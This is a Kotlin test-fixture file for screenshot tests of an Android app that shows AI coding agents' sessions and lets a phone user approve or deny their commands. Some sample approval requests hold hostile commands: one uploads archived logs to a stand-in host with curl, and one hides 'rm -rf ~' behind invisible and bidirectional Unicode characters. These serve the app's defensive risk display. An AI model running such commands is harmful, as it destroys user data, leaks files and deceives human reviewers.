package dev.agentnest.app.shots

import dev.agentnest.app.data.PairedInfo
import dev.agentnest.core.link.LinkError
import dev.agentnest.core.link.LinkState
import dev.agentnest.core.nest.NestReducer
import dev.agentnest.core.nest.NestState
import dev.agentnest.core.protocol.AdapterMode
import dev.agentnest.core.protocol.AdapterStatusKind
import dev.agentnest.core.protocol.AdapterStatusPayload
import dev.agentnest.core.protocol.AgentEvent
import dev.agentnest.core.protocol.AgentKind
import dev.agentnest.core.protocol.AgentState
import dev.agentnest.core.protocol.ApprovalDetails
import dev.agentnest.core.protocol.ApprovalOutcome
import dev.agentnest.core.protocol.ApprovalRequest
import dev.agentnest.core.protocol.ApprovalResolvedMessage
import dev.agentnest.core.protocol.ApprovalResolvedPayload
import dev.agentnest.core.protocol.Counters
import dev.agentnest.core.protocol.Decision
import dev.agentnest.core.protocol.Delivery
import dev.agentnest.core.protocol.DetailsKind
import dev.agentnest.core.protocol.EventCategory
import dev.agentnest.core.protocol.EventKind
import dev.agentnest.core.protocol.EventSource
import dev.agentnest.core.protocol.ExtraConfirmationLevel
import dev.agentnest.core.protocol.FrameMeta
import dev.agentnest.core.protocol.LastTest
import dev.agentnest.core.protocol.Limits
import dev.agentnest.core.protocol.ObservedResult
import dev.agentnest.core.protocol.PcInfo
import dev.agentnest.core.protocol.Policy
import dev.agentnest.core.protocol.Project
import dev.agentnest.core.protocol.RecentCommand
import dev.agentnest.core.protocol.RecentFile
import dev.agentnest.core.protocol.RemoteApproval
import dev.agentnest.core.protocol.Resync
import dev.agentnest.core.protocol.ResyncMode
import dev.agentnest.core.protocol.ResolvedBy
import dev.agentnest.core.protocol.ReviewInfo
import dev.agentnest.core.protocol.RiskInfo
import dev.agentnest.core.protocol.RiskLevel
import dev.agentnest.core.protocol.SessionMeta
import dev.agentnest.core.protocol.SessionState
import dev.agentnest.core.protocol.Severity
import dev.agentnest.core.protocol.SnapshotMessage
import dev.agentnest.core.protocol.SnapshotPayload
import dev.agentnest.core.protocol.SnapshotTruncated
import dev.agentnest.core.protocol.Summary
import dev.agentnest.core.protocol.TestStatus
import dev.agentnest.core.protocol.TurnInfo
import dev.agentnest.core.protocol.Ts
import dev.agentnest.core.protocol.WelcomeMessage
import dev.agentnest.core.protocol.WelcomePayload
import java.time.Instant
import java.time.temporal.ChronoUnit

/** Deterministic fixtures for the screenshot tests. Everything is relative to [NOW]; nothing here is a real secret. */
object SD {
    val NOW: Instant = Instant.now().truncatedTo(ChronoUnit.SECONDS)
    val PC = PcInfo(pcId = "pc_8252e6280a3d81d1", name = "DESKTOP-HOME", appVersion = "0.1.0", os = "windows")
    val PAIRED = PairedInfo("dev_demo_1", PC.pcId, PC.name, listOf("192.168.0.10", "desk-pc.local"), true)

    const val S1 = "claude_code:s1"
    const val S2 = "codex:s2"
    const val S3 = "claude_code:s3"
    const val REQ_HIGH = "ar_01929f1a-6c2e-7b3c-9e4d-000000000001"
    const val REQ_CRIT = "ar_01929f1a-6c2e-7b3c-9e4d-000000000002"
    const val REQ_MED = "ar_01929f1a-6c2e-7b3c-9e4d-000000000003"
    const val REQ_LOW = "ar_01929f1a-6c2e-7b3c-9e4d-000000000004"
    const val REQ_LONG = "ar_01929f1a-6c2e-7b3c-9e4d-000000000005"
    const val REQ_EXPIRING = "ar_01929f1a-6c2e-7b3c-9e4d-000000000006"
    const val REQ_HIDDEN = "ar_01929f1a-6c2e-7b3c-9e4d-000000000007"
    const val REQ_CODEX = "ar_01929f1a-6c2e-7b3c-9e4d-000000000008"

    private var idCounter = 0
    private fun id(): String = "01929f1a-0000-7000-8000-%012d".format(++idCounter)

    fun connected() = LinkState.Connected(PC, NOW.minusSeconds(600), 24)

    fun session(
        key: String,
        state: AgentState,
        agent: AgentKind = AgentKind.CLAUDE_CODE,
        project: String = "agentnest",
        branch: String? = "main",
        headline: String = "",
        remote: RemoteApproval = RemoteApproval.AVAILABLE,
        pending: List<String> = emptyList(),
        ended: Boolean = false,
        sinceSeconds: Long = 90,
        lastEventSecondsAgo: Long = 5,
        counters: Counters = Counters(tools = 14, filesModified = 3, commands = 5, tests = 2, errors = 0),
        lastTest: LastTest? = null,
        title: String? = null,
        model: String? = "claude-demo",
        cost: Double? = 0.42,
        context: Double? = 37.0,
        review: ReviewInfo? = null,
        detail: String? = null,
    ) = SessionState(
        sessionKey = key,
        agentKind = agent,
        agentLabel = agent.shortName,
        project = Project("pk_$project", project, branch = branch),
        state = state,
        stateSince = Ts.of(NOW.minusSeconds(sinceSeconds)),
        headline = headline,
        detail = detail,
        startedAt = Ts.of(NOW.minusSeconds(1800)),
        turn = TurnInfo(active = state != AgentState.IDLE, startedAt = Ts.of(NOW.minusSeconds(sinceSeconds))),
        permissionMode = "default",
        remoteApproval = remote,
        pendingApprovalIds = pending,
        counters = counters,
        recentFiles = listOf(
            RecentFile("android/app/src/main/kotlin/dev/agentnest/app/ui/home/HomeScreen.kt", "modified", Ts.of(NOW.minusSeconds(40))),
            RecentFile("docs/android.md", "read", Ts.of(NOW.minusSeconds(90))),
        ),
        recentCommands = listOf(
            RecentCommand("./gradlew :core:test", "test", 0, Ts.of(NOW.minusSeconds(60))),
            RecentCommand("git status", "git", 0, Ts.of(NOW.minusSeconds(120))),
        ),
        lastTest = lastTest,
        meta = SessionMeta(title = title, model = model, costUsd = cost, contextUsedPct = context, review = review),
        lastEventSeq = 40,
        lastEventAt = Ts.of(NOW.minusSeconds(lastEventSecondsAgo)),
        ended = ended,
    )

    fun request(
        id: String,
        level: RiskLevel,
        extra: ExtraConfirmationLevel,
        title: String,
        tool: String = "Bash",
        command: String? = null,
        files: List<String> = emptyList(),
        diff: String? = null,
        reasons: List<String> = emptyList(),
        purpose: String? = "테스트를 다시 돌리기 전에 의존성을 새로 설치합니다.",
        secondsLeft: Long = 105,
        ttl: Long = 120,
        sessionKey: String = S1,
        agent: AgentKind = AgentKind.CLAUDE_CODE,
        origin: String = "claude_code.hook.http",
        allowed: List<Decision> = listOf(Decision.ALLOW, Decision.DENY, Decision.DENY_AND_STOP),
        cwd: String? = "C:\\Users\\dev\\agentnest",
        kind: DetailsKind = DetailsKind.COMMAND,
        truncated: Boolean = false,
    ): ApprovalRequest {
        val expires = NOW.plusSeconds(secondsLeft)
        return ApprovalRequest(
            requestId = id,
            nonceB64 = "nj8VYyTULw6ktvT86B1W+w==",
            sessionKey = sessionKey,
            agentKind = agent,
            agentLabel = agent.shortName,
            project = Project("pk_agentnest", "agentnest", branch = "main"),
            origin = origin,
            createdAt = Ts.of(expires.minusSeconds(ttl)),
            expiresAt = Ts.of(expires),
            ttlSeconds = ttl.toInt(),
            toolName = tool,
            title = title,
            purpose = purpose,
            details = ApprovalDetails(
                kind = kind,
                command = command,
                cwdHint = cwd,
                filePaths = files,
                diffPreview = diff,
                truncated = truncated,
            ),
            toolInputSha256 = "940519b4cf559666e1068256e714a63ef4b8df29e78fc02b9b75079bbeae4032",
            risk = RiskInfo(level, listOf("r"), reasons, extra),
            allowedDecisions = allowed,
            authRequiredFor = listOf(Decision.ALLOW, Decision.DENY_AND_STOP),
        )
    }

    val reqHigh get() = request(
        REQ_HIGH, RiskLevel.HIGH, ExtraConfirmationLevel.HOLD, "명령을 실행하려고 해요",
        command = "rm -rf node_modules && pnpm install", files = listOf("node_modules"),
        reasons = listOf("폴더를 통째로 지우는 명령"),
    )
    val reqCritical get() = request(
        REQ_CRIT, RiskLevel.CRITICAL, ExtraConfirmationLevel.HOLD_AND_RECONFIRM, "명령을 실행하려고 해요",
        command = "git push --force origin main", reasons = listOf("원격 저장소의 기록을 덮어써요", "되돌리기 어려워요"),
        purpose = "main 브랜치를 정리하려고 합니다.", secondsLeft = 90,
    )
    val reqMedium get() = request(
        REQ_MED, RiskLevel.MEDIUM, ExtraConfirmationLevel.NONE, "파일을 수정하려고 해요", tool = "Edit",
        files = listOf("android/app/src/main/kotlin/dev/agentnest/app/ui/home/HomeScreen.kt", "docs/android.md"),
        diff = "@@ -12,3 +12,4 @@\n-    val padding = 8.dp\n+    val padding = 12.dp\n+    val gap = 4.dp",
        reasons = listOf("프로젝트 파일을 바꿔요"), kind = DetailsKind.FILE_EDIT, purpose = "여백을 조금 넓힙니다.", secondsLeft = 100,
    )
    val reqLow get() = request(
        REQ_LOW, RiskLevel.LOW, ExtraConfirmationLevel.NONE, "파일을 읽으려고 해요", tool = "Read",
        files = listOf("docs/protocol.md"), kind = DetailsKind.FILE_READ, purpose = null, secondsLeft = 110,
    )
    val reqLong get() = request(
        REQ_LONG, RiskLevel.HIGH, ExtraConfirmationLevel.HOLD, "명령을 실행하려고 해요",
        command = "find . -type f -name '*.log' -newer C:\\Users\\dev\\agentnest\\build\\reports\\tests\\testDebugUnitTest\\classes\\" +
            "dev.agentnest.app.ReviewRegressionTest.html -print0 | xargs -0 -I{} sh -c 'cp {} /tmp/backup/ && gzip -9 /tmp/backup/\$(basename {}) && echo done {}' " +
            "&& curl -sS -X POST https://example.invalid/upload?token=REDACTED --data-binary @/tmp/backup/all.tar.gz",
        files = listOf(
            "C:\\Users\\dev\\agentnest\\android\\app\\src\\main\\kotlin\\dev\\agentnest\\app\\ui\\approvals\\ApprovalDetailScreen.kt",
            "C:\\Users\\dev\\agentnest\\build\\reports\\tests\\testDebugUnitTest\\classes\\dev.agentnest.app.ReviewRegressionTest.html",
        ),
        reasons = listOf("외부 주소로 파일을 보내요"), truncated = true, cwd = "C:\\Users\\dev\\agentnest\\android\\app",
    )
    val reqExpiring get() = request(
        REQ_EXPIRING, RiskLevel.MEDIUM, ExtraConfirmationLevel.NONE, "명령을 실행하려고 해요",
        command = "pnpm install", secondsLeft = 12, reasons = listOf("패키지를 설치해요"),
    )
    val reqHidden get() = request(
        REQ_HIDDEN, RiskLevel.HIGH, ExtraConfirmationLevel.HOLD, "명령을 실행하려고 해요",
        command = "echo safe\u200B\u202E; rm -rf ~", reasons = listOf("보이지 않는 문자가 들어 있어요"),
    )
    val reqCodex get() = request(
        REQ_CODEX, RiskLevel.MEDIUM, ExtraConfirmationLevel.NONE, "명령을 실행하려고 해요", sessionKey = S2,
        agent = AgentKind.CODEX, origin = "codex.hook.cli", allowed = listOf(Decision.ALLOW, Decision.DENY_AND_STOP),
        command = "npm test", reasons = emptyList(),
    )

    fun event(
        seq: Long,
        kind: EventKind,
        headline: String,
        secondsAgo: Long,
        severity: Severity = Severity.INFO,
        category: EventCategory = EventCategory.COMMAND,
        sessionKey: String = S1,
        agent: AgentKind = AgentKind.CLAUDE_CODE,
        detail: String? = null,
    ) = AgentEvent(
        eventId = id(),
        seq = seq,
        ts = Ts.of(NOW.minusSeconds(secondsAgo)),
        agentKind = agent,
        sessionKey = sessionKey,
        kind = kind,
        category = category,
        severity = severity,
        summary = Summary(headline, detail),
        source = EventSource("claude_code.hook.http", null, emptyMap()),
    )

    val events: List<AgentEvent>
        get() = listOf(
            event(40, EventKind.FILE_MODIFIED, "HomeScreen.kt를 수정했어요", 20, category = EventCategory.FILE),
            event(39, EventKind.TEST_FAILED, "테스트 2개가 실패했어요", 70, Severity.ERROR, EventCategory.COMMAND, detail = "ReviewRegressionTest · UiLogicTest"),
            event(38, EventKind.COMMAND_STARTED, "./gradlew :core:test", 95),
            event(37, EventKind.APPROVAL_REQUESTED, "명령 실행 승인을 요청했어요", 130, category = EventCategory.APPROVAL),
            event(36, EventKind.TOOL_COMPLETED, "파일 3개를 읽었어요", 200, category = EventCategory.TOOL),
            event(35, EventKind.TURN_STARTED, "새 작업을 시작했어요", 320, category = EventCategory.TURN),
            event(34, EventKind.COMMAND_FAILED, "pnpm build가 실패했어요", 3600, Severity.ERROR, detail = "종료 코드 1"),
            event(33, EventKind.TEST_PASSED, "테스트가 모두 통과했어요", 3700, sessionKey = S2, agent = AgentKind.CODEX),
            event(32, EventKind.SESSION_STARTED, "세션을 시작했어요", 90_000, category = EventCategory.LIFECYCLE),
        )

    val errorEvents: List<AgentEvent>
        get() = listOf(
            event(39, EventKind.TEST_FAILED, "테스트 2개가 실패했어요", 70, Severity.ERROR, EventCategory.COMMAND, detail = "ReviewRegressionTest · UiLogicTest"),
        )

    private fun welcome(at: Instant, policy: Policy) = WelcomeMessage(
        FrameMeta(id(), Ts.of(at), null),
        WelcomePayload(
            pc = PC,
            capabilities = listOf("events", "approvals", "events_history"),
            serverTime = Ts.of(at),
            resync = Resync(ResyncMode.SNAPSHOT),
            limits = Limits(),
            policy = policy,
        ),
    )

    private fun snapshot(
        sessions: List<SessionState>,
        approvals: List<ApprovalRequest>,
        events: List<AgentEvent>,
        errors: List<AgentEvent>,
        at: Instant,
    ) = SnapshotMessage(
        FrameMeta(id(), Ts.of(at), 41),
        SnapshotPayload(
            sessions = sessions,
            pendingApprovals = approvals,
            recentErrors = errors,
            recentEvents = events,
            adapters = listOf(
                AdapterStatusPayload(AgentKind.CLAUDE_CODE, AdapterStatusKind.CONNECTED, AdapterMode.HOOKS_HTTP),
                AdapterStatusPayload(AgentKind.CODEX, AdapterStatusKind.DEGRADED, AdapterMode.ROLLOUT_TAIL, "승인 연동은 아직 확인 중이에요"),
            ),
            pendingApprovalIdsComplete = approvals.map { it.requestId },
            truncated = SnapshotTruncated(),
        ),
    )

    /**
     * Builds a [NestState] through the real reducer so mood, headline and the approval gates are exactly what the
     * app computes. Time steps are spread out so the mood hysteresis (1.5 s) never hides the target mood.
     */
    fun nest(
        link: LinkState = connected(),
        sessions: List<SessionState> = emptyList(),
        approvals: List<ApprovalRequest> = emptyList(),
        events: List<AgentEvent> = emptyList(),
        errors: List<AgentEvent> = emptyList(),
        fromCacheSavedAgo: Long? = null,
        history: List<Triple<ApprovalRequest, ApprovalOutcome, ResolvedBy>> = emptyList(),
        policy: Policy = Policy(),
    ): NestState {
        val reducer = NestReducer { id() }
        val snap = snapshot(sessions, approvals + history.map { it.first }, events, errors, NOW.minusSeconds(5))
        if (fromCacheSavedAgo != null) {
            return reducer.restoreFromCache(snap, NOW.minusSeconds(fromCacheSavedAgo), NOW, link)
        }
        var s = reducer.initial(NOW.minusSeconds(30), LinkState.Unpaired)
        if (link is LinkState.Unpaired) return s.let { reducer.onLink(it, link, NOW) }
        s = reducer.onLink(s, connected(), NOW.minusSeconds(20))
        s = reducer.reduce(s, welcome(NOW.minusSeconds(10), policy), NOW.minusSeconds(10)).state
        s = reducer.reduce(s, snap, NOW.minusSeconds(5)).state
        for ((req, outcome, by) in history) {
            val msg = ApprovalResolvedMessage(FrameMeta(id(), Ts.of(NOW.minusSeconds(4)), null), resolved(req, outcome, by))
            s = reducer.reduce(s, msg, NOW.minusSeconds(4)).state
        }
        if (link !is LinkState.Connected) s = reducer.onLink(s, link, NOW)
        else s = reducer.tick(s, NOW).state
        return s
    }

    fun resolved(req: ApprovalRequest, outcome: ApprovalOutcome, by: ResolvedBy = ResolvedBy.PHONE) = ApprovalResolvedPayload(
        requestId = req.requestId,
        sessionKey = req.sessionKey,
        outcome = outcome,
        resolvedBy = by,
        resolvedAt = Ts.of(NOW.minusSeconds(600)),
        delivery = Delivery.DELIVERED,
        observedResult = ObservedResult.NOT_YET_KNOWN,
        messageKo = null,
    )

    private fun histReq(n: String, title: String, command: String?, level: RiskLevel) = request(
        "ar_01929f1a-6c2e-7b3c-9e4d-hist$n", level, ExtraConfirmationLevel.NONE, title, command = command,
    )

    val reconnecting = LinkState.Reconnecting(2, NOW.plusSeconds(8), LinkError.Unreachable)

    // ---- ready-made home scenarios -----------------------------------------------------------------------------

    val idle get() = nest()
    val unpaired get() = nest(link = LinkState.Unpaired)
    val working get() = nest(
        sessions = listOf(session(S1, AgentState.WRITING_CODE, headline = "홈 화면의 여백을 다듬고 있어요", title = "홈 화면 정리")),
        events = events,
    )
    val workingWeak get() = nest(
        sessions = listOf(session(S1, AgentState.WORKING, headline = "작업을 진행하고 있어요")),
        events = events,
    )
    val reviewing get() = nest(sessions = listOf(session(S1, AgentState.REVIEWING, headline = "변경 내용을 살펴보고 있어요")), events = events)
    val testing get() = nest(
        sessions = listOf(
            session(S1, AgentState.TESTING, headline = "테스트를 돌리고 있어요", lastTest = LastTest(TestStatus.RUNNING, "gradle", "gradle", Ts.of(NOW.minusSeconds(10)))),
        ),
        events = events,
    )
    val approval get() = nest(
        sessions = listOf(
            session(S1, AgentState.AWAITING_APPROVAL, headline = "명령 실행 승인을 기다려요", pending = listOf(REQ_HIGH)),
        ),
        approvals = listOf(reqHigh),
        events = events,
    )
    val error get() = nest(
        sessions = listOf(
            session(
                S1, AgentState.ERROR, headline = "테스트가 실패해서 멈췄어요",
                counters = Counters(tools = 14, filesModified = 3, commands = 5, tests = 2, errors = 2),
                lastTest = LastTest(TestStatus.FAILED, "gradle", "gradle", Ts.of(NOW.minusSeconds(70))),
            ),
        ),
        events = events,
        errors = errorEvents,
    )
    val completed get() = nest(
        sessions = listOf(session(S1, AgentState.COMPLETED, headline = "작업을 마쳤어요", sinceSeconds = 1)),
        events = events,
    )
    val awaitingInput get() = nest(
        sessions = listOf(session(S1, AgentState.AWAITING_INPUT, headline = "어느 방식으로 할지 물어봐요")),
        events = events,
    )
    val reconnectingCached get() = nest(
        link = reconnecting,
        sessions = listOf(session(S1, AgentState.WRITING_CODE, headline = "홈 화면의 여백을 다듬고 있어요")),
        events = events,
        fromCacheSavedAgo = 190,
    )
    val offline get() = nest(
        link = LinkState.Offline,
        sessions = listOf(session(S1, AgentState.WRITING_CODE, headline = "홈 화면의 여백을 다듬고 있어요")),
        events = events,
        fromCacheSavedAgo = 400,
    )
    val unreachable get() = nest(
        link = LinkState.PcUnreachable(NOW.minusSeconds(240)),
        sessions = listOf(session(S1, AgentState.WORKING, headline = "작업을 진행하고 있어요")),
        events = events,
        fromCacheSavedAgo = 300,
    )
    val needsRepair get() = nest(
        link = LinkState.NeedsRepair(dev.agentnest.core.link.RepairReason.IDENTITY_CHANGED),
        fromCacheSavedAgo = 3000,
    )
    val sessionLost get() = nest(
        sessions = listOf(session(S1, AgentState.DISCONNECTED, headline = "", lastEventSecondsAgo = 400)),
        events = events,
    )
    val multi get() = nest(
        sessions = listOf(
            session(S1, AgentState.AWAITING_APPROVAL, headline = "명령 실행 승인을 기다려요", pending = listOf(REQ_HIGH, REQ_MED)),
            session(S2, AgentState.TESTING, AgentKind.CODEX, "agentnest", "feature/shots", "테스트를 돌리고 있어요",
                lastTest = LastTest(TestStatus.PASSED, "cargo", "cargo", Ts.of(NOW.minusSeconds(30))), remote = RemoteApproval.UNAVAILABLE, model = "codex-demo"),
            session(S3, AgentState.WRITING_CODE, AgentKind.CLAUDE_CODE, "docs-site", "main", "문서를 고치고 있어요", cost = null, context = 88.0),
            session("claude_code:s4", AgentState.COMPLETED, AgentKind.CLAUDE_CODE, "old-project", "main", "작업을 마쳤어요", ended = true, lastEventSecondsAgo = 60),
        ),
        approvals = listOf(reqHigh, reqMedium),
        events = events,
    )
    val manyApprovals get() = nest(
        sessions = listOf(
            session(S1, AgentState.AWAITING_APPROVAL, headline = "승인을 기다려요", pending = listOf(REQ_CRIT, REQ_HIGH, REQ_MED, REQ_LOW)),
            session(S2, AgentState.AWAITING_APPROVAL, AgentKind.CODEX, headline = "승인을 기다려요", pending = listOf(REQ_CODEX), remote = RemoteApproval.AVAILABLE),
        ),
        approvals = listOf(reqCritical, reqHigh, reqMedium, reqLow, reqCodex),
        events = events,
        history = listOf(
            Triple(histReq("h1", "명령을 실행하려고 해요", "pnpm test", RiskLevel.MEDIUM), ApprovalOutcome.ALLOWED, ResolvedBy.PHONE),
            Triple(histReq("h2", "파일을 수정하려고 해요", null, RiskLevel.LOW), ApprovalOutcome.DENIED, ResolvedBy.PHONE),
            Triple(histReq("h3", "명령을 실행하려고 해요", "rm -rf build", RiskLevel.HIGH), ApprovalOutcome.EXPIRED, ResolvedBy.TIMEOUT),
            Triple(histReq("h4", "명령을 실행하려고 해요", "git push", RiskLevel.HIGH), ApprovalOutcome.HANDED_OFF_LOCAL, ResolvedBy.DESKTOP),
            Triple(histReq("h5", "명령을 실행하려고 해요", "git push --force", RiskLevel.CRITICAL), ApprovalOutcome.DENIED_AND_STOPPED, ResolvedBy.PHONE),
        ),
    )

    fun withApproval(request: ApprovalRequest, remote: RemoteApproval = RemoteApproval.AVAILABLE): NestState = nest(
        sessions = listOf(
            session(
                request.sessionKey, AgentState.AWAITING_APPROVAL, request.agentKind, headline = "승인을 기다려요",
                pending = listOf(request.requestId), remote = remote,
            ),
        ),
        approvals = listOf(request),
        events = events,
    )
}
